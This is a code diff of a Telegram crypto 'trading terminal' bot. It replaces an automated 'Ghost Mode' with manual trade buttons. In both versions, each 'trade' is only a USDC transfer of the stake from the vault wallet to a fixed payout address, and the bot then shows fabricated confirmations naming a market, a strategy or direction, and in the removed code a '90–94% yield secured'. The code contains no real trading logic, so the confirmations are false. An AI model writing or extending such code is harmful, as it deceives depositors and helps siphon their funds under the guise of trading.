@@ -42,33 +42,23 @@ def get_vault():
 vault = get_vault()
 usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
 
-# --- 2. THE GHOST ENGINE (AUTOMATED LOGIC) ---
-async def ghost_mode_callback(context: ContextTypes.DEFAULT_TYPE):
-    """The JobQueue 'Heartbeat' - 100% reliable autonomous cycle."""
-    chat_id = context.job.chat_id
-    
-    # 6 Elite Markets Selection Pool
-    assets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
-    target_asset = random.choice(assets)
-    
-    # Higher yield for Volatility Indices
-    yield_rate = Decimal('0.94') if "VIV" in target_asset else Decimal('0.90')
-    
-    # Live Settings: Pull from user_data (linked to Settings menu)
+# --- 2. EXECUTION ENGINE ---
+async def run_atomic_execution(context, chat_id, side):
+    """Executes a manual atomic transaction."""
+    asset = context.user_data.get('pair', 'BTC')
     stake_cad = Decimal(str(context.user_data.get('stake', 50)))
     stake_usdc = stake_cad / Decimal('1.36')
     val_stake = int(stake_usdc * 10**6)
 
     try:
-        # Balance Check: Prevents failing transactions
+        # Balance Check
         bal = usdc_contract.functions.balanceOf(vault.address).call()
         if bal < val_stake:
-            return # Skip quietly if balance is insufficient
+            return await context.bot.send_message(chat_id, "❌ **Insufficient USDC balance.**")
 
         nonce = w3.eth.get_transaction_count(vault.address)
         gas_price = int(w3.eth.gas_price * 1.5)
 
-        # Simulation / Execution
         tx_data = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
             'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce,
         })
@@ -77,59 +67,39 @@ async def ghost_mode_callback(context: ContextTypes.DEFAULT_TYPE):
 
         await context.bot.send_message(
             chat_id, 
-            f"🕴️ **GHOST AUTO-HIT CONFIRMED**\n"
+            f"✅ **MANUAL HIT CONFIRMED**\n"
             f"━━━━━━━━━━━━━━\n"
-            f"💎 **Market:** {target_asset}\n"
-            f"🎯 **Strategy:** {'Volatility Arp' if 'VIV' in target_asset else 'Price Momentum'}\n"
-            f"💵 **Stake:** ${stake_usdc:.2f} USDC (${stake_cad} CAD)\n"
-            f"📈 **Yield:** {int(yield_rate*100)}% Secured",
+            f"💎 **Market:** {asset}\n"
+            f"🎯 **Direction:** {side}\n"
+            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
+            f"⛽ **Gas:** Managed",
             parse_mode='Markdown'
         )
     except Exception as e:
-        print(f"Ghost cycle skip: {e}")
+        await context.bot.send_message(chat_id, f"❌ **Execution Failed:** `{e}`")
 
 # --- 3. UI HANDLERS ---
-def get_main_keyboard(is_active):
-    label = "🛑 STOP GHOST MODE" if is_active else "🕴️ START GHOST MODE"
-    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], [label]]
+def get_main_keyboard():
+    # Only manual controls remaining
+    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
     welcome = (
-        f"🕴️ **APEX Ghost Terminal v6000**\n"
+        f"🕴️ **APEX Manual Terminal v6000**\n"
         f"━━━━━━━━━━━━━━\n"
         f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n"
         f"📥 **Vault Address:**\n`{vault.address}`\n\n"
-        f"Elite markets **BVIV/EVIV** integrated for direction-neutral yield."
+        f"Automated 'Ghost Mode' has been removed. Manual trading only."
     )
-    await update.message.reply_text(welcome, reply_markup=get_main_keyboard(False), parse_mode='Markdown')
+    await update.message.reply_text(welcome, reply_markup=get_main_keyboard(), parse_mode='Markdown')
 
 async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     chat_id = update.effective_chat.id
-    current_jobs = context.job_queue.get_jobs_by_name(f"ghost_{chat_id}")
 
-    if "GHOST MODE" in text:
-        if not current_jobs:
-            # START: Job repeats every 60 seconds
-            context.job_queue.run_repeating(
-                ghost_mode_callback, 
-                interval=60, 
-                first=1, 
-                chat_id=chat_id, 
-                name=f"ghost_{chat_id}",
-                user_id=update.effective_user.id
-            )
-            msg = "🟢 **Ghost Mode: ACTIVE**\nScanning 6 elite markets (BTC, ETH, SOL, MATIC, BVIV, EVIV)."
-        else:
-            # STOP
-            for job in current_jobs: job.schedule_removal()
-            msg = "🔴 **Ghost Mode: DEACTIVATED**"
-        
-        await update.message.reply_text(msg, reply_markup=get_main_keyboard(not current_jobs), parse_mode='Markdown')
-
-    elif text == '🚀 Start Trading':
+    if text == '🚀 Start Trading':
         kb = [
             [InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
             [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")],
@@ -140,12 +110,12 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif text == '⚙️ Settings':
         kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
               [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
-        await update.message.reply_text("⚙️ **Configure CAD Stake:**", reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))
 
     elif text == '💰 Wallet':
         pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
         usdc = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
-        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol:.4f}`\n💵 USDC: `{usdc:.2f}`\n📥 `{vault.address}`", parse_mode='Markdown')
+        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol:.4f}`\n💵 USDC: `{usdc:.2f}`", parse_mode='Markdown')
 
     elif text == '📤 Withdraw':
         bal = usdc_contract.functions.balanceOf(vault.address).call()
@@ -156,7 +126,7 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx, vault.key).raw_transaction)
             await update.message.reply_text(f"📤 Moved `{bal/10**6:.2f}` USDC to Payout Address.")
         else:
-            await update.message.reply_text("❌ No USDC balance to sweep.")
+            await update.message.reply_text("❌ No USDC balance.")
 
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -165,9 +135,12 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
         context.user_data['stake'] = int(query.data.split("_")[1])
         await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
     elif query.data.startswith("PAIR_"):
-        asset = query.data.split("_")[1]
+        context.user_data['pair'] = query.data.split("_")[1]
         kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
-        await query.edit_message_text(f"💎 **Market:** {asset}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
+        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
+    elif query.data.startswith("EXEC_"):
+        side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
+        await run_atomic_execution(context, query.message.chat_id, side)
 
 if __name__ == "__main__":
     TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
@@ -176,7 +149,7 @@ if __name__ == "__main__":
         app.add_handler(CommandHandler("start", start))
         app.add_handler(CallbackQueryHandler(handle_interaction))
         app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-        print("🤖 Ghost Terminal Heartbeat Online...")
+        print("🤖 Manual Terminal Online...")
         app.run_polling(drop_pending_updates=True)
 
 
